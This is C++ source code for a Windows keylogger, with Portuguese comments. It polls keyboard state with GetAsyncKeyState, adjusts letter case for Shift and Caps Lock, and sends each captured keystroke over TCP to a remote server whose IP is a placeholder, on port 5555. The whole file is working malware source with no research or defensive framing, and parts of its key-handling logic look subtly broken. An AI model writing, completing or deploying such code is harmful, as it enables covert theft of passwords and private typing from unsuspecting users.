#include <winsock2.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "seu_ip_aqui"  // Endereço IP do servidor
#define SERVER_PORT 5555       // Porta do servidor

// Função auxiliar para verificar se o caractere é letra, número ou espaço
bool isAlphaNumericOrSpace(char key) {
    return (key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9') || (key == ' ');
}

// Função auxiliar para verificar se o Shift está pressionado
bool isShiftPressed() {
    return (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
}

// Função auxiliar para verificar o estado do Caps Lock
bool isCapsLockActive() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

void sendKeystrokes(SOCKET sock) {
    char key;

    while (true) {
        for (key = 8; key <= 190; key++) {
            SHORT keyState = GetAsyncKeyState(key);

            // Captura a tecla apenas quando for pressionada pela primeira vez
            if (keyState & 0x0001) {
                if (isAlphaNumericOrSpace(key)) {
                    // Verifica o estado de Shift e Caps Lock para ajustar as letras
                    if (key >= 'a' && key <= 'z') {
                        if (isCapsLockActive() && !isShiftPressed()) {
                            key -= 32;  // Converte para maiúscula ('a' = 97, 'A' = 65)
                        } else if (!isCapsLockActive() && isShiftPressed()) {
                            key -= 32;  // Converte para maiúscula
                        }
                    } else if (key >= 'A' && key <= 'Z') {
                        if (isCapsLockActive() && isShiftPressed()) {
                            key += 32;  // Converte para minúscula ('A' = 65, 'a' = 97)
                        } else if (!isCapsLockActive() && !isShiftPressed()) {
                            key += 32;  // Converte para minúscula
                        }
                    }

                    // Se for tecla de espaço (VK_SPACE)
                    if (key == VK_SPACE) {
                        key = ' ';
                    }
                    // Envia a tecla processada para o servidor
                    char message[2] = { key, '\0' };
                    send(sock, message, 1, 0);
                }
            }
        }
        Sleep(50);  // Pausa para reduzir a carga da CPU
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in serverAddr;

    // Inicializa Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Erro ao iniciar Winsock" << std::endl;
        return 1;
    }

    // Cria o socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Erro ao criar socket" << std::endl;
        WSACleanup();
        return 1;
 }

    // Configura o endereço do servidor
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Conecta ao servidor
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Erro ao conectar ao servidor" << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "Conectado ao servidor. Capturando teclas..." << std::endl;

    // Captura e envia teclas
    sendKeystrokes(sock);

    closesocket(sock);
    WSACleanup();
    return 0;
}
